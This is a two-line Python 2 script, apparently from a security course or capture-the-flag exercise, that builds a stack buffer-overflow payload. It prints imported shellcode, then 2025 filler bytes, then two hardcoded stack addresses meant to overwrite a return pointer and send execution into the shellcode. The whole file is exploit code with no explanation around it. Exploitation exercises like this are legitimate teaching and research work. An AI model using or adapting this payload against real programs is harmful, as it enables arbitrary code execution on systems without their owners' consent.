from shellcode import shellcode
print shellcode + '\x01'*2025 + '\xe8\xda\xfe\xbf\xfc\xe2\xfe\xbf'
